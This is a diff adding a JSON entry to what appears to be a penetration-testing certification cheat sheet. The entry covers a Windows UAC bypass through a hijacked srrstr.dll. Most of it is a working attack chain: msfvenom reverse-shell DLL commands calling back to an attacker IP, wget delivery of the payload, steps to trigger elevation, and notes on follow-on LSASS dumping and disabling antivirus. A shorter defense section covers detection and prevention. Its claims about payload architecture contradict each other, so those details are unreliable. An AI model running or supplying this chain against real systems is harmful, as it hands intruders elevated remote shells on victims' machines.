@@ -1,0 +1,89 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "msfvenom",
+    "rundll32"
+  ],
+  "tags": [
+    "uac",
+    "dll-hijack",
+    "bypass"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - User Account Control",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "Build the malicious srrstr.dll",
+      "command": "msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll"
+    },
+    {
+      "label": "Place it in the WindowsApps path",
+      "command": "# C:\\Users\\<user>\\AppData\\Local\\Microsoft\\WindowsApps\\srrstr.dll"
+    },
+    {
+      "label": "Test-run the DLL via rundll32",
+      "command": "rundll32 shell32.dll,Control_RunDLL C:\\Users\\<user>\\AppData\\Local\\Microsoft\\WindowsApps\\srrstr.dll"
+    },
+    {
+      "label": "Trigger the auto-elevating binary",
+      "command": "C:\\Windows\\SysWOW64\\SystemPropertiesAdvanced.exe"
+    }
+  ],
+  "notes": "=== UAC Bypass — DLL Hijacking via SystemPropertiesAdvanced.exe ===\nAuto-elevating trusted binary loads missing DLL from user-writable PATH location.\n\n=== TECHNICAL MECHANISM ===\nSystemPropertiesAdvanced.exe (32-bit, in C:\\Windows\\SysWOW64):\n- Is an auto-elevating binary (manifest marks it as auto-elevate)\n- Windows elevates it without a UAC consent prompt because it's a signed Microsoft binary\n- When launched, it attempts to load srrstr.dll (System Restore) but it doesn't exist in expected paths\n- Windows DLL search order includes WindowsApps directory\n- WindowsApps (C:\\Users\\<user>\\AppData\\Local\\Microsoft\\WindowsApps) is in PATH and WRITABLE by current user\n- Malicious srrstr.dll placed there gets loaded in the already-elevated process context\n\n=== ATTACK FLOW ===\nStep 1: Generate 32-bit reverse shell DLL (must match 32-bit process)\n  msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f dll -o srrstr.dll\n\nStep 2: Deliver to writable PATH location\n  python3 -m http.server 8080\n  (on target) wget http://<IP>:8080/srrstr.dll -O C:\\Users\\<user>\\AppData\\Local\\Microsoft\\WindowsApps\\srrstr.dll\n\nStep 3: Test execution at standard level (verify DLL works before triggering elevation)\n  rundll32 shell32.dll,Control_RunDLL srrstr.dll\n  → Should get callback at current integrity level (confirms delivery + connectivity)\n\nStep 4: Kill test processes\n  taskkill /IM rundll32.exe /F\n\nStep 5: Trigger auto-elevation\n  C:\\Windows\\SysWOW64\\SystemPropertiesAdvanced.exe\n  → Process auto-elevates, loads srrstr.dll from WindowsApps, callback arrives elevated\n\n=== RESULT ===\nShell running as same user BUT with full administrator token active (high integrity)\nwhoami /priv shows full privilege set including SeImpersonatePrivilege, SeDebugPrivilege, etc.\n\n=== BUILD SPECIFICITY ===\nUACME Technique 54 — tested on build 14393 (Windows 10 1607)\nAlways check Windows build before selecting bypass: [environment]::OSVersion.Version\nOther techniques at https://github.com/hfiref0x/UACME for other builds\n\n=== CHAINING CONTEXT ===\nUAC bypass → elevated token → SeLoadDriverPrivilege for Print Operators (Capcom chain)\nUAC bypass → elevated token → SeDebugPrivilege → LSASS dump\nUAC bypass → elevated token → SeImpersonate → Potato attacks\nUAC bypass → elevated token → Enable RDP, disable AV, deploy persistence\nThis is always a prerequisite step, not a final destination",
+  "references": [
+    {
+      "title": "egre55 System Properties UAC bypass",
+      "url": "https://egre55.github.io/system-properties-uac-bypass"
+    },
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "uac-enum",
+      "note": "Confirms UAC state and build compatibility.",
+      "rel": "prereq"
+    }
+  ],
+  "id": "uac-bypass-srrstr",
+  "name": "UAC Bypass - SystemPropertiesAdvanced DLL Hijack",
+  "command": "C:\\Windows\\SysWOW64\\SystemPropertiesAdvanced.exe",
+  "description": "An auto-elevating binary loads srrstr.dll from a user-writable WindowsApps path. Drop a malicious srrstr.dll there and launch SystemPropertiesAdvanced.exe to run code in a high-integrity context (egre55 technique).",
+  "opsec": "loud",
+  "mitre": [
+    "T1548.002"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "SystemPropertiesAdvanced.exe is a UAC auto-elevation binary (marked with autoElevate in its manifest). It loads srrstr.dll at medium integrity. Windows DLL search order checks the application directory before System32. Since the application directory is in WindowsApps (accessible via PATH), a malicious srrstr.dll placed there is loaded instead of the legitimate System32 one. The DLL runs in the auto-elevated process at high integrity — bypassing UAC without a consent prompt.",
+    "prerequisites": "Standard user with a local account (not a domain admin). Windows 10 x64. PATH includes %LOCALAPPDATA%\\Microsoft\\WindowsApps before System32. Ability to write to the WindowsApps directory.",
+    "impact": "UAC bypass leading to high-integrity shell execution without UAC consent prompt. Enables further privilege escalation using high-integrity tools.",
+    "detection": "Malicious DLL dropped in WindowsApps directory. SystemPropertiesAdvanced.exe execution at unexpected times. DLL load audit: srrstr.dll loaded from WindowsApps instead of System32. Sysmon Event 7: DLL loaded from non-standard path.",
+    "artifacts": "File: srrstr.dll in %LOCALAPPDATA%\\Microsoft\\WindowsApps | Process: SystemPropertiesAdvanced.exe loading unexpected DLL | Sysmon Event 7: image load from WindowsApps | Shell: elevated process spawned without UAC prompt",
+    "prevention": "Set UAC to 'Always notify' (ConsentPromptBehaviorAdmin = 2) — highest level prevents auto-elevation bypass. Ensure PATH does not include user-writable directories before System32. Windows 11 tightened this specific bypass — update from Windows 10.",
+    "misconfiguration": "UAC configured below maximum level (default Windows 10 allows auto-elevation of manifested binaries). %LOCALAPPDATA%\\Microsoft\\WindowsApps in PATH before System32. User can write to WindowsApps directory.",
+    "vulnerable_config": "# Check UAC level:\nREG QUERY HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA\nREG QUERY HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin\n# ConsentPromptBehaviorAdmin = 5 <- vulnerable (not max level)\n\n# UAC bypass:\nmsfvenom -p windows/x64/shell_reverse_tcp -f dll -o srrstr.dll LHOST=10.10.14.3 LPORT=8443\ncopy srrstr.dll '%LOCALAPPDATA%\\Microsoft\\WindowsApps\\'\nSystemPropertiesAdvanced.exe  # loads srrstr.dll, returns elevated shell",
+    "secure_config": "# Set UAC to Always Notify:\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 2 /f\n\n# Or via GPO: Computer Configuration > Windows Settings > Security Settings\n# > Local Policies > Security Options\n# > UAC: Behavior of the elevation prompt for administrators = Prompt for credentials\n\n# Monitor WindowsApps directory for new DLLs",
+    "sources": [
+      "HTB M26",
+      "MITRE T1548.002"
+    ]
+  }
+}
